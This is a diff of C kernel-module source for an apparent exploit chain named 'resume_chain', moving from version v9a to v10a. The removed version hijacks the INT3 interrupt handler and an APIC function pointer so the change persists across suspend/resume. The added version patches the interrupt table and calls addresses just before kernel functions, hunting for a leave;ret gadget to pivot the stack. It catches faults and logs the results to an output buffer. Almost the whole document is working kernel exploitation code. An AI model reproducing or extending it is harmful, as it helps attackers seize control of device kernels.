@@ -1,56 +1,46 @@
 #include <stdint.h>
 
 /*
- * resume_chain v9a — CC bounce persistence test
+ * resume_chain v10a — fn-2 probe for leave;ret gadget discovery
  *
- * Tests the doreti_iret bounce with the CONFIRMED CC byte at
- * get_timer_freq - 1 (ktext+0x29431F). This is v7 mode 0x2 redux
- * but with the correct CC byte (v7 failed because xapic_mode-1 = C3).
+ * INT3 (CC) during LAPIC resume is BROKEN (v3, v9a both failed).
+ * Alternative: find a leave;ret (C9 C3) gadget for stack pivot.
  *
- * Modes (selected by fw_ver):
- *   0x0901 = ARM:      Set IDT[3]=doreti_iret IST=0, apic_ops[2]=CC byte
- *   0x0903 = READBACK: After resume, verify persistence, restore originals
+ * For entries where fn-1 = C3 (ret), fn-2 might be C9 (leave).
+ * If so, calling fn-2 executes leave;ret → RSP=RBP → stack pivot.
  *
- * The CC bounce flow during LAPIC resume:
- *   call *apic_ops[2]  (= get_timer_freq - 1 = CC byte)
- *   → INT3 fires
- *   → IDT[3] = doreti_iret (iretq)
- *   → CPU pushes {RIP=get_timer_freq, CS, RFLAGS, RSP, SS}
- *   → iretq pops everything back
- *   → get_timer_freq executes, returns 0x13b0
- *   → clean return to LAPIC caller
- *
- * Self-sustaining: works every call, every CPU, every suspend/resume.
- * No IST, no ROP chain, no multi-CPU race.
+ * fw_ver encoding:
+ *   0xDD00 + entry_index → probe fn-2 of that apic_ops entry
+ *   0xEE00 + entry_index → probe fn-1 (v8f mode, for reference)
  *
  * Output layout (64 uint64_t slots):
- *   out[0]  = MAGIC (lo32) + status (hi32)
- *   out[1]  = kdata_base
- *   out[2]  = ktext_base
+ *   out[0]     = MAGIC (lo32) + status (hi32)
+ *   out[1]     = kdata_base
+ *   out[2]     = ktext_base
+ *   out[3]     = td_pcb
+ *   out[4..31] = apic_ops fn ptrs
+ *   out[32]    = step progress
+ *   out[33]    = target entry index
+ *   out[34]    = target fn ptr
+ *   out[35]    = probe address (fn-2 or fn-1)
+ *   out[36]    = call result (RAX after call)
+ *   out[37]    = verdict: 0=unknown, 1=changed(executed), 2=sentinel(ret), 3=faulted
+ *   out[38]    = probe type (1=fn-1, 2=fn-2)
+ *   out[63]    = end marker
  *
- * ARM (0x0901):
- *   out[3]  = doreti_iret address
- *   out[4]  = original xapic_mode (apic_ops[2])
- *   out[5]  = CC target (get_timer_freq - 1)
- *   out[6]  = original IDT[3] handler
- *   out[7]  = new IDT[3] handler (should = doreti_iret)
- *   out[8]  = original IDT[3] lo qword (saved for restore)
- *   out[9]  = original IDT[3] hi qword (saved for restore)
- *   out[10] = original apic_ops[2] value (saved for restore)
- *   out[63] = end marker
+ * Key entries to probe fn-2 (where fn-1 = C3):
+ *   [2]  xapic_mode    ktext+0x294340  fn-1=C3  fn-2=?
+ *   [14] set_lvt_mode  ktext+0x28E700  fn-1=C3  fn-2=?
  *
- * READBACK (0x0903):
- *   out[3]  = persist check: IDT[3] handler
- *   out[4]  = persist check: apic_ops[2] value
- *   out[5]  = armed marker from kdata+0x200
- *   out[6]  = armed mode from kdata+0x208
- *   out[7]  = current IDT[3] lo qword
- *   out[8]  = current IDT[3] hi qword
- *   out[9]  = idt3 handler persisted? (1=yes)
- *   out[10] = apic_ops[2] persisted? (1=yes)
- *   out[11] = restored IDT[3]? (1=yes)
- *   out[12] = restored apic_ops[2]? (1=yes)
- *   out[63] = end marker
+ * Possible fn-2 outcomes:
+ *   C9 (leave) → leave;ret → stack pivot, crash (RBP unknown)
+ *   48 (REX.W) → REX.W ret → clean return (sentinel unchanged)
+ *   5D (pop rbp) → pop rbp; ret → pops return addr into RBP, wild ret
+ *   CC (INT3) → doreti_iret catches → fn-1=C3=ret → clean return
+ *   90 (NOP) → falls through to C3=ret → clean return
+ *   other → #UD/#GP → crash
+ *
+ * Magic written EARLY so kldload can read partial output on crash.
  */
 
 #define MAGIC_RSCN       0x5253434E
@@ -59,18 +49,13 @@
 #define OFF_APIC_OPS     0x1934AC8
 #define OFF_IDT          0x64cdc80
 #define OFF_DORETI_IRET  (-0x9cf84c)
-#define OFF_GET_TIMER_FREQ 0x294320
 #define IDT_ENTRY_SIZE   16
+#define APIC_OPS_COUNT   28
 
-/* Persistence area in kdata (survives suspend/resume) */
-#define PERSIST_BASE     0x200
-#define PERSIST_MARKER   (PERSIST_BASE + 0x00)  /* 8 bytes: armed marker */
-#define PERSIST_MODE     (PERSIST_BASE + 0x08)  /* 8 bytes: armed mode */
-#define PERSIST_IDT3_LO  (PERSIST_BASE + 0x10)  /* 8 bytes: original IDT[3] lo */
-#define PERSIST_IDT3_HI  (PERSIST_BASE + 0x18)  /* 8 bytes: original IDT[3] hi */
-#define PERSIST_APIC2    (PERSIST_BASE + 0x20)  /* 8 bytes: original apic_ops[2] */
+#define TD_PCB           0x3f8
+#define PCB_ONFAULT      0x108
 
-#define ARMED_MARKER     0xCC90CC90CC90CC90ULL
+#define SENTINEL         0xBAD0BAD0BAD0BAD0ULL
 
 typedef struct {
     uint64_t kdata_base;
@@ -124,15 +109,6 @@ static inline void write4(uint64_t addr, uint32_t val)
     *(volatile uint32_t *)addr = val;
 }
 
-/* Extract handler address from IDT gate descriptor */
-static uint64_t idt_get_handler(uint64_t idt_entry_addr)
-{
-    uint16_t lo = read2(idt_entry_addr + 0);
-    uint16_t mid = read2(idt_entry_addr + 6);
-    uint32_t hi = read4(idt_entry_addr + 8);
-    return (uint64_t)lo | ((uint64_t)mid << 16) | ((uint64_t)hi << 32);
-}
-
 static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
 {
     write2(idt_entry_addr + 0, (uint16_t)(handler & 0xFFFF));
@@ -142,12 +118,65 @@ static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t i
     write4(idt_entry_addr + 8, (uint32_t)((handler >> 32) & 0xFFFFFFFF));
 }
 
+/*
+ * Call target address with sentinel in RAX.
+ * Returns RAX value after the call.
+ * pcb_onfault armed for #PF recovery.
+ *
+ * NOTE: If target is leave;ret (C9 C3), this function will NOT return
+ * normally — RSP gets pivoted. The caller should write magic EARLY.
+ */
+static uint64_t probe_call(uint64_t target, uint64_t onfault_addr)
+{
+    uint64_t result;
+    __asm__ volatile(
+        "leaq 2f(%%rip), %%rcx\n\t"
+        "movq %%rcx, (%[onfault])\n\t"
+
+        "movabsq $0xBAD0BAD0BAD0BAD0, %%rax\n\t"
+        "callq *%[target]\n\t"
+
+        "movq %%rax, %[result]\n\t"
+        "movq $0, (%[onfault])\n\t"
+        "jmp 1f\n\t"
+
+        "2:\n\t"
+        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"
+
+        "1:\n\t"
+        : [result] "=&r"(result)
+        : [target] "r"(target), [onfault] "r"(onfault_addr)
+        : "rax", "rcx", "rdx", "rsi", "rdi",
+          "r8", "r9", "r10", "r11", "memory", "cc"
+    );
+    return result;
+}
+
 int module_start(kproc_args *args)
 {
     uint64_t kdata_base = args->kdata_base;
     uint32_t fw_ver = args->fw_ver;
     volatile uint64_t *out = (volatile uint64_t *)args;
     volatile uint32_t *out32 = (volatile uint32_t *)args;
+
+    uint16_t mode_prefix = (fw_ver >> 8) & 0xFF;
+    int target_idx = (int)(fw_ver & 0xFF);
+    int probe_offset;  /* how many bytes before fn to probe */
+
+    if (mode_prefix == 0xDD) {
+        probe_offset = 2;  /* fn-2 probe */
+    } else if (mode_prefix == 0xEE) {
+        probe_offset = 1;  /* fn-1 probe (v8f compatible) */
+    } else {
+        /* Unknown mode — clear and report */
+        for (int i = 0; i < 64; i++) out[i] = 0;
+        out[1] = kdata_base;
+        out[3] = fw_ver;
+        out32[1] = 0x00FD;
+        __asm__ volatile("mfence" ::: "memory");
+        out32[0] = MAGIC_RSCN;
+        return 0;
+    }
 
     /* Clear output buffer */
     for (int i = 0; i < 64; i++)
@@ -159,111 +188,95 @@ int module_start(kproc_args *args)
     out[1] = kdata_base;
     out[2] = ktext_base;
 
+    /* Write magic EARLY for crash-safe readback */
+    out[38] = probe_offset;
+    out32[1] = 0x010A;  /* v10a in-progress */
+    __asm__ volatile("mfence" ::: "memory");
+    out32[0] = MAGIC_RSCN;
+
+    out[32] = 0x01;  /* step: starting */
+
+    /* Validate target index */
+    if (target_idx >= APIC_OPS_COUNT) {
+        out[33] = target_idx;
+        out32[1] = 0x00FE;
+        return 0;
+    }
+
+    /* Get curthread → td_pcb → onfault_addr */
+    uint64_t curthread;
+    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
+    uint64_t td_pcb = read8(curthread + TD_PCB);
+    out[3] = td_pcb;
+
+    if (!td_pcb) {
+        out32[1] = 0x00FF;
+        return 0;
+    }
+
+    uint64_t onfault_addr = td_pcb + PCB_ONFAULT;
+
+    /* Read all 28 fn ptrs from kdata (proven safe) */
+    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
+    for (int i = 0; i < APIC_OPS_COUNT; i++)
+        out[4 + i] = read8(apic_ops_addr + i * 8);
+
+    out[32] = 0x02;  /* step: fn ptrs read */
+
+    /* Get target fn ptr */
+    uint64_t fn = out[4 + target_idx];
+    out[33] = target_idx;
+    out[34] = fn;
+
+    if (fn == 0) {
+        out[35] = 0;
+        out[37] = 0;
+        out32[1] = 0x01F0;
+        return 0;
+    }
+
+    uint64_t probe_addr = fn - probe_offset;
+    out[35] = probe_addr;
+
+    /* Save original IDT[3] (16 bytes) */
     uint64_t idt_base = kdata_base + OFF_IDT;
     uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
-    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
-    uint64_t apic_ops_2_addr = apic_ops_addr + 2 * 8;
+    uint64_t idt3_orig_lo = read8(idt3_addr);
+    uint64_t idt3_orig_hi = read8(idt3_addr + 8);
+
+    /* Set IDT[3] = doreti_iret, IST=0 (catches INT3 if fn-2 = CC) */
     uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
-    uint64_t cc_target = ktext_base + OFF_GET_TIMER_FREQ - 1;
+    idt_set_handler(idt3_addr, doreti_iret, 0);
 
-    uint16_t mode = fw_ver & 0xFFFF;
+    out[32] = 0x03;  /* step: IDT[3] armed */
 
-    if (mode == 0x0901) {
-        /* === ARM MODE === */
+    /* === SINGLE PROBE === */
+    out[32] = 0x100 + target_idx;  /* step: probing */
 
-        /* Read originals */
-        uint64_t orig_idt3_lo = read8(idt3_addr);
-        uint64_t orig_idt3_hi = read8(idt3_addr + 8);
-        uint64_t orig_handler = idt_get_handler(idt3_addr);
-        uint64_t orig_apic2 = read8(apic_ops_2_addr);
+    uint64_t result = probe_call(probe_addr, onfault_addr);
+    out[36] = result;
 
-        /* Save originals to persistence area (survives suspend/resume) */
-        write8(kdata_base + PERSIST_IDT3_LO, orig_idt3_lo);
-        write8(kdata_base + PERSIST_IDT3_HI, orig_idt3_hi);
-        write8(kdata_base + PERSIST_APIC2, orig_apic2);
+    /* If we get here, the call returned (didn't crash/pivot) */
 
-        /* Set IDT[3] = doreti_iret, IST=0 */
-        idt_set_handler(idt3_addr, doreti_iret, 0);
-
-        /* Set apic_ops[2] = get_timer_freq - 1 (CC byte) */
-        write8(apic_ops_2_addr, cc_target);
-
-        /* Write armed marker LAST */
-        write8(kdata_base + PERSIST_MODE, 0x0901);
-        __asm__ volatile("mfence" ::: "memory");
-        write8(kdata_base + PERSIST_MARKER, ARMED_MARKER);
-
-        /* Report */
-        out[3] = doreti_iret;
-        out[4] = orig_apic2;
-        out[5] = cc_target;
-        out[6] = orig_handler;
-        out[7] = idt_get_handler(idt3_addr);  /* verify: should = doreti_iret */
-        out[8] = orig_idt3_lo;
-        out[9] = orig_idt3_hi;
-        out[10] = orig_apic2;
-        out[63] = 0xdeadbeefcafe0901ULL;
-
-        out32[1] = 0x0191;  /* v9a ARM complete */
-        __asm__ volatile("mfence" ::: "memory");
-        out32[0] = MAGIC_RSCN;
-
-    } else if (mode == 0x0903) {
-        /* === READBACK MODE (after resume) === */
-
-        /* Read current state */
-        uint64_t cur_handler = idt_get_handler(idt3_addr);
-        uint64_t cur_apic2 = read8(apic_ops_2_addr);
-        uint64_t marker = read8(kdata_base + PERSIST_MARKER);
-        uint64_t armed_mode = read8(kdata_base + PERSIST_MODE);
-        uint64_t cur_idt3_lo = read8(idt3_addr);
-        uint64_t cur_idt3_hi = read8(idt3_addr + 8);
-
-        /* Read saved originals */
-        uint64_t saved_idt3_lo = read8(kdata_base + PERSIST_IDT3_LO);
-        uint64_t saved_idt3_hi = read8(kdata_base + PERSIST_IDT3_HI);
-        uint64_t saved_apic2 = read8(kdata_base + PERSIST_APIC2);
-
-        /* Check persistence */
-        int idt3_persisted = (cur_handler == doreti_iret) ? 1 : 0;
-        int apic2_persisted = (cur_apic2 == cc_target) ? 1 : 0;
-
-        /* Restore originals */
-        write8(idt3_addr, saved_idt3_lo);
-        write8(idt3_addr + 8, saved_idt3_hi);
-        write8(apic_ops_2_addr, saved_apic2);
-
-        /* Verify restoration */
-        int idt3_restored = (read8(idt3_addr) == saved_idt3_lo) ? 1 : 0;
-        int apic2_restored = (read8(apic_ops_2_addr) == saved_apic2) ? 1 : 0;
-
-        /* Clear armed marker */
-        write8(kdata_base + PERSIST_MARKER, 0);
-
-        /* Report */
-        out[3] = cur_handler;
-        out[4] = cur_apic2;
-        out[5] = marker;
-        out[6] = armed_mode;
-        out[7] = cur_idt3_lo;
-        out[8] = cur_idt3_hi;
-        out[9] = idt3_persisted;
-        out[10] = apic2_persisted;
-        out[11] = idt3_restored;
-        out[12] = apic2_restored;
-        out[63] = 0xdeadbeefcafe0903ULL;
-
-        out32[1] = 0x0193;  /* v9a READBACK complete */
-        __asm__ volatile("mfence" ::: "memory");
-        out32[0] = MAGIC_RSCN;
-
+    /* Classify result */
+    if (result == SENTINEL) {
+        out[37] = 2;  /* sentinel unchanged: ret/NOP+ret/REX+ret */
+    } else if (result == 0xFAFAFAFAFAFAFAFAULL) {
+        out[37] = 3;  /* faulted (#PF caught by pcb_onfault) */
     } else {
-        /* Unknown mode */
-        out[3] = mode;
-        out32[1] = 0x00FD;
-        __asm__ volatile("mfence" ::: "memory");
-        out32[0] = MAGIC_RSCN;
+        out[37] = 1;  /* RAX changed: function executed (CC→fn or other) */
     }
+
+    /* Restore original IDT[3] */
+    write8(idt3_addr, idt3_orig_lo);
+    write8(idt3_addr + 8, idt3_orig_hi);
+
+    out[32] = 0x04;  /* step: complete */
+
+    out[63] = 0xdeadbeefcafe010AULL;
+
+    /* Update magic with completion status */
+    out32[1] = 0x110A;  /* v10a complete */
 
     return 0;
 }
